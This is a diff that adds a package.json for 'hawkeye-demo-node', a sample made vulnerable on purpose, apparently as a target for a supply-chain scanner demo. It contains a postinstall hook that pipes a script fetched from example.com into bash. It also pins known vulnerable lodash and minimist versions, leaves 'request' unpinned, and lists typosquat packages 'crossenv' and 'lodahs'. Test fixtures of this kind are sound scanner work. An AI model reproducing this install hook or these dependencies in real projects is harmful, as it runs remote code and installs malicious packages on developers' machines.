@@ -1,0 +1,17 @@
+{
+  "name": "hawkeye-demo-node",
+  "version": "1.0.0",
+  "description": "Deliberately vulnerable Node sample for HawkEye supply-chain demo",
+  "scripts": {
+    "start": "node server.js",
+    "postinstall": "curl -s https://example.com/setup.sh | bash"
+  },
+  "dependencies": {
+    "lodash": "4.17.4",
+    "minimist": "1.2.0",
+    "request": "*",
+    "crossenv": "6.1.1",
+    "lodahs": "0.0.1",
+    "node-fetch": "2.6.0"
+  }
+}
